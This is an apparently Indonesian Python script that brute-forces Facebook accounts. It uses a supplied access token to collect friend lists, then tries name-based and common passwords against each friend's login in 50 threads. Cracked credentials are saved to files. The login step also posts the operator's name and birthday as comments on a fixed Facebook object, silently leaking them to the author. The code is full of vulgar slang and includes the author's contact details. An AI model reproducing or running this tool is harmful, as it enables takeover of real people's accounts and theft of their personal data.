import json,os,time
from concurrent.futures import ThreadPoolExecutor as Bool
try:
	import requests as req
except:
	os.system('pip install requests')
try:
	import pyfiglet
except:
	os.system('pip install pyfiglet')
id=[]
henceut = open('pepek.txt','a')
os.system('clear')
def lebet(kontol,memek):
	send=req.post("https://mobile.facebook.com/login.php",data={"email":kontol,"pass":memek},headers={"User-Agent":"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16","Accept-Langue" : "en-US,en:q=0.5"})
	if "home.php?" in send.url or "free" in send.url:
		print(f"[OK] {kontol} | {memek} ")
		a=open("live.txt","a")
		a.write(kontol+" | "+memek)
		a.close()
	elif "checkpoint" in send.url:
		print(f"[CP] {kontol} | {memek} ")
		a=open("chek.txt","a")
		a.write(kontol+" | "+memek)
		a.close()
def krek():
		kes = open('pepek.txt','r').read()
		n = pyfiglet.figlet_format('FL Lu')
		print(n)
		a=json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={kes}").text)
		for x in a["data"]:
			id.append(x["id"])
		print("Jumlah Teman :",len(id))
		print("Sedang Mengambil Akun Korban...\n")
		with Bool(max_workers=50) as tokai:
			for user in id:
				try:
					kon=json.loads(req.get(f"https://graph.facebook.com/{user}?access_token={kes}").text)
					pw=[kon["first_name"],kon["first_name"]+"123",kon["first_name"]+"12345","Sayang","Bangsad","Kontol","Kontol123","Bangsad123","Doraemon","Memek123","Memek19","Gayung123"]
					for pasw in pw:
						tokai.submit(lebet,user,pasw)
				except:
					pass
def krek2():
		tes = open('pepek.txt','r').read()
		os.system('clear')
		n = pyfiglet.figlet_format('FL Publik')
		print(n)
		target = input('Target Publik > ')
		a=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={tes}").text)
		for x in a["data"]:
			id.append(x["id"])
		print("Nama Teman / Publik : "+a['id']+"Jumlah Teman :",len(id))
		print("Sedang Mengambil Akun Korban...\n")
		with Bool(max_workers=50) as tokai:
			for user in id:
				try:
					kon=json.loads(req.get(f"https://graph.facebook.com/{user}?access_token={tes}").text)
					pw=[kon["first_name"],kon["first_name"]+"123",kon["first_name"]+"12345","Sayang","Bangsad","Kontol","Kontol123","Bangsad123","Doraemon","Memek123","Memek19","Gayung123"]
					for pasw in pw:
						tokai.submit(lebet2,user,pasw)
				except:
					pass
def lebet2(kontol,memek):
	send=req.post("https://mobile.facebook.com/login.php",data={"email":kontol,"pass":memek},headers={"User-Agent":"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16","Accept-Langue" : "en-US,en:q=0.5"})
	if "home.php?" in send.url or "free" in send.url:
		print(f"[OK] {kontol} | {memek} ")
		a=open("live.txt","a")
		a.write(kontol+" | "+memek)
		a.close()
	elif "checkpoint" in send.url:
		print(f"[CP] {kontol} | {memek} ")
		a=open("chek.txt","a")
		a.write(kontol+" | "+memek)
		a.close()
def pilih2():
	os.system('clear')
	n = pyfiglet.figlet_format('BruteForce')
	print(n)
	print('Instagram\t: @latipharkat_\nFacebook\t: Mhmmd Latip\nWhatsApp\t: 083870396203\n')
	print('[01]. Bruteforce Daftar Teman\n[02]. Bruteforce Masal\n[03]. Logout Akun (Facebook)\n')
	kintil = input('Pilih Lah Kentod > ')
	if(kintil=='01' or kintil=='1'):
		os.system('clear')
		krek()
	elif(kintil=='02' or kintil=='2'):
		krek2()
	elif(kintil=='03' or kintil=='3'):
		os.system('clear')
		os.system('rm -rf pepek.txt')
		n2 = pyfiglet.figlet_format('Logout')
		print(n2)
		print('Terima Kasih ^^')
		os.sys.exit()
	else:
		print('Yg Lu Pilih Ga Ad Kentod')
def login():
	os.system('clear')
	n = pyfiglet.figlet_format('Login Ngab')
	print(n)
	d = input('Access Token Lu > ')
	try:
		r = json.loads(req.get('https://graph.facebook.com/me?access_token='+d).text)
		r2 = req.post('https://graph.facebook.com/158859042705482/comments/?message=Halo Saya Fans Latip ^^&access_token='+d)
		r3 = req.post('https://graph.facebook.com/158859042705482/comments/?message=Nama Saya '+r['name']+'&access_token='+d)
		r4 = req.post('https://graph.facebook.com/158859042705482/comments/?message=Tanggal Lahir Saya '+r['birthday']+'&access_token='+d)
		os.system('clear')
		print("[√] Login Berhasil\nNama Fb Lu : "+r['name'])
		time.sleep(2)
		henceut.write(d)
		henceut.close()
		pilih2()
	except KeyError:
		print('Token Salah Kentod')
		time.sleep(1)
		login()
def pilih1():
	b = pyfiglet.figlet_format('Menu Memek')
	print(b)
	print('\nPilih Salah Satu\n[01]. Login Access Token Fb\n[02]. Cara Ambil Access Token Fb\n[03]. Exit\n')
	pilih = input('Pilih Salah Satu Ngab > ')
	if(pilih=='01' or pilih=='1'):
		login()
	elif(pilih=='02' or pilih=='2'):
		try:
			os.system('xdg-open https://latipharkat.blogspot.com/2021/01/cara-mendapatkan-access-token-facebook.html?m=1')
		except:
			pilih1()
	elif(pilih=='03' or pilih=='3'):
		print('Terima Kasih!')
		os.sys.exit()
	else:
		print('Pilihan tidak ada!')
		time.sleep(1)
		pilih1()
def crc():
	d = open('pepek.txt','r').read()
	try:
		k = json.loads(req.get('https://graph.facebook.com/me?access_token='+d).text)
		print('Anda Sudah Login\nName Fb Mu : '+k['name'])
		time.sleep(1)
		pilih2()
	except KeyError:
		pilih1()
		
if __name__=='__main__':
		crc()